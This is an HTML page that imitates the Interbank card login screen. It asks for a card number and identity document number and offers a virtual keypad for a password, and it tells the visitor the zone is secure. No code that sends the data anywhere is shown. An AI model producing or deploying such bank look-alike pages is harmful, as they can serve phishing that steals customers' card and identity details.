<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BANCO INTERBANK</title>
    <link rel="icon" href="escuela_danza/img/favi.ico" type="image/x-icon">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
    <link rel="stylesheet" href="teclado.css">
</head>

<body>

    <header class="container-fluid bg-white text-center py-4">
        <p class="text-blue mb-0 fs-4 Lato-Bold">INTERBANK</p>
        <img src="..." class="rounded mx-auto d-block" alt="...">
        <p class="text-blue mb-0 fs-6 Lato-Bold">Usted se encuentra en una zona segura</p>
    </header>

    <div class="container-fluid justify-content-center">
        <form id="login-form" action="#" method="post" onsubmit="return validateForm()">

            <div class="mb-3">
                <label for="card-type" class="form-label">Seleccione:</label>
                <select id="card-type" name="card-type" class="form-select" required>
                    <option value="">Seleccione una opción</option>
                    <option value="multired-debito">Multired Global Débito</option>
                    <option value="multired-credito">Multired Global Crédito</option>
                </select>
            </div>

            <div class="mb-3">
                <label for="card-number" class="form-label">Número de tarjeta:</label>
                <input type="text" id="card-number" name="card-number" maxlength="16" class="form-control"
                    placeholder="Ingrese su número de tarjeta" required>
            </div>

            <div class="mb-3">
                <label for="document-type" class="form-label">Tipo y N° Documento:</label>
                <select id="document-type" name="document-type" class="form-select" required>
                    <option value="">Seleccione...</option>
                    <option value="dni">DNI</option>
                    <option value="pasaporte">Pasaporte</option>
                    <option value="ce">Carné de Extranjería</option>
                </select>
            </div>

            <div class="mb-3">
                <label for="document-number" class="form-label">Número de documento:</label>
                <input type="text" id="document-number" name="document-number" maxlength="12" class="form-control"
                    placeholder="Ingrese su N° de documento" required>
            </div>

            <div class="grid">
                <button class="casilla" id="casilla0"></button>
                <button class="casilla" id="casilla1"></button>
                <button class="casilla" id="casilla2"></button>
                <button class="casilla" id="casilla3"></button>
                <button class="casilla" id="casilla4"></button>
                <button class="casilla" id="casilla5"></button>
                <button class="casilla" id="casilla6"></button>
                <button class="casilla" id="casilla7"></button>
                <button class="casilla" id="casilla8"></button>
            </div>

            <button class="btn btn-primary mt-4" onclick="generarNumeros()">GENERÉ SU CONTRASEÑA</button>
        </form>
    </div>

    <script src="components.js"></script>

</body>

</html>
